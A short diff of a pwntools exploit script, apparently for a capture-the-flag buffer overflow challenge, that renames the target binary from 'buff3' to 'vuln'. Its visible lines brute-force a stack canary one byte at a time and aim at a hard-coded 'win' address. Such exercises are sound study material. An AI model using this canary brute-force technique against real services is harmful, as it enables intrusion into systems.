@@ -8,7 +8,7 @@ win = 0x080486eb #address of win
 
 for i in range(4):
     for guess in range(256):
-        t = pwn.process("./buff3")
+        t = pwn.process("./vuln")
         t.recvuntil(b'How Many Bytes will You Write Into the Buffer?\n> ')
         size = 32+1+i
         t.sendline(str(size))
@@ -26,7 +26,7 @@ for i in range(4):
 
 #print canarybytes
 
-t = pwn.process("./buff3")
+t = pwn.process("./vuln")
 #pwn.gdb.attach(t)
 t.recvuntil(b'How Many Bytes will You Write Into the Buffer?\n> ')
 t.sendline("56")
